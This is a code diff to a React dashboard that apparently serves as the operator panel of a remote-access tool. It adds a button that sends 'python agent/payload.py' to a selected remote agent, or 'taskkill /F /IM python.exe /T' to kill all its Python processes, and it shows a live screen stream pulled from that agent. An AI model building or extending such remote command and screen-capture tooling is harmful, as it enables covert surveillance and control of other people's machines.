@@ -27,6 +27,25 @@ export default function Dashboard() {
   const [loading, setLoading] = useState(true);
   const [executing, setExecuting] = useState(false);
   const [sidebarOpen, setSidebarOpen] = useState(true);
+  const [streaming, setStreaming] = useState(false);
+
+  const toggleStream = async () => {
+    if (!selectedAgent) return;
+    const nextState = !streaming;
+    setStreaming(nextState);
+    
+    // Command the agent to start/stop the payload script
+    const cmd = nextState ? "python agent/payload.py" : "taskkill /F /IM python.exe /T";
+    try {
+      await fetch(`${API_BASE}/command/send`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agentId: selectedAgent.id, command: cmd }),
+      });
+    } catch (error) {
+      console.error("Failed to toggle stream", error);
+    }
+  };
 
   const fetchAgents = async () => {
     try {
@@ -128,7 +147,10 @@ export default function Dashboard() {
             agents.map((agent) => (
               <button
                 key={agent.id}
-                onClick={() => setSelectedAgent(agent)}
+                onClick={() => {
+                  setSelectedAgent(agent);
+                  setStreaming(false); // Reset stream when switching agents
+                }}
                 className={`w-full text-left p-3 rounded-xl transition-all duration-200 border ${
                   selectedAgent?.id === agent.id 
                     ? "bg-rose-500/10 border-rose-500/30 text-rose-50" 
@@ -169,8 +191,15 @@ export default function Dashboard() {
                 </div>
               </div>
               <div className="flex gap-3">
-                <button className="px-4 py-2 bg-zinc-900 border border-zinc-800 hover:border-zinc-700 rounded-lg text-sm font-medium transition-all">
-                  Screenshot
+                <button 
+                  onClick={toggleStream}
+                  className={`px-4 py-2 border rounded-lg text-sm font-medium transition-all ${
+                    streaming 
+                      ? "bg-rose-600 border-rose-500 text-white shadow-lg shadow-rose-900/20" 
+                      : "bg-zinc-900 border-zinc-800 hover:border-zinc-700 text-zinc-300"
+                  }`}
+                >
+                  {streaming ? "Stop Stream" : "Live Stream"}
                 </button>
                 <button className="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-sm font-medium transition-all shadow-lg shadow-rose-900/20">
                   Terminate
@@ -180,6 +209,21 @@ export default function Dashboard() {
 
             {/* Content Area */}
             <div className="flex-1 overflow-y-auto p-6 space-y-6">
+              {/* Live Stream View */}
+              {streaming && (
+                <div className="w-full bg-black rounded-2xl border border-zinc-800 overflow-hidden relative group">
+                  <img 
+                    src={`${API_BASE}/stream/live?t=${Date.now()}`} 
+                    alt="Live Stream" 
+                    className="w-full h-auto max-h-[600px] object-contain mx-auto"
+                  />
+                  <div className="absolute top-4 left-4 flex items-center gap-2 bg-rose-600/80 backdrop-blur-md px-3 py-1.5 rounded-full text-[10px] font-bold tracking-widest uppercase">
+                    <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
+                    LIVE
+                  </div>
+                </div>
+              )}
+
               {/* Quick Stats */}
               <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <div className="p-4 bg-zinc-900/50 border border-zinc-800 rounded-2xl flex items-center gap-4">
